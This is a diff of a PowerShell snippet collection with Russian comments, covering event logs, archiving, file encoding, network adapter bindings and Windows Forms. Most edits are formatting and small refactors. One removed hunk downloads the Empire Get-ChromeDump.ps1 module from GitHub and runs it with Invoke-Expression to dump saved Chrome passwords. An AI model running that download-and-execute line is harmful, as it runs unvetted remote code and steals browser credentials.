@@ -193,8 +193,8 @@ enum Level
 	LogAlways		= 0
 	Critical		= 1
 	Error			= 2
-	Warning			=3
-	Informational	=	4
+	Warning			= 3
+	Informational	= 4
 	Verbose			= 5
 }
 Get-WinEvent -LogName System | Where-Object -FilterScript {$_.LevelDisplayName -match "Критическая" -or $_.LevelDisplayName -match "Ошибка"}
@@ -232,6 +232,9 @@ Start-BitsTransfer -Source $url -Destination $output
 $start_time = Get-Date
 Write-Output "Time taken: $((Get-Date).Subtract($start_time).Milliseconds) second(s)"
 
+# Создать архив
+Get-ChildItem -Path D:\folder -Filter *.ps1 -Recurse | Compress-Archive -DestinationPath D:\folder2 -CompressionLevel Optimal
+
 # Разархивировать архив
 $HT = @{
 	Path = "D:\1.zip"
@@ -242,7 +245,8 @@ $HT = @{
 Expand-Archive @HT
 
 # Конвертировать файл в кодировку UTF8 с BOM
-(Get-Content -Path "D:\file.ext" -Encoding UTF8) | Set-Content -Encoding UTF8 -Path "D:\file.ext"
+$Path = "D:\file.ext"
+(Get-Content -Path $Path -Encoding UTF8) | Set-Content -Encoding UTF8 -Path $Path
 
 # Конвертировать файл в кодировку UTF8 без BOM
 $utf8 = New-Object System.Text.UTF8Encoding $false
@@ -469,13 +473,8 @@ $ComponentIDs = @(
 )
 Disable-NetAdapterBinding -Name Ethernet -ComponentID $ComponentIDs
 
-# Изменить кодировку файла
-[System.Text.Encoding]::GetEncodings()
-Out-File -FilePath file.ext -Encoding UTF8 -Force
-Add-Content -Path file.ext -Value content -Encoding UTF8 -Force
-
 # Вычислить продолжительность видеофайлов в папке
-# code.avalon-zone.be/retrieve-the-extended-attibutes-of-a-file
+# http://code.avalon-zone.be/retrieve-the-extended-attibutes-of-a-file
 Function Get-Duration
 {
 	param ($TargetFolder)
@@ -551,12 +550,6 @@ $Button.Add_Click(
 )
 # Отобразить форму
 $window_form.ShowDialog()
-
-# Вывести сохраненные пароли Google Chrome
-$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'
-$code = Invoke-RestMethod -Uri $url -UseBasicParsing
-Invoke-Expression $code
-Get-ChromeDump
 
 # Найти неустановленные обновления
 $UpdateSession = New-Object -ComObject Microsoft.Update.Session
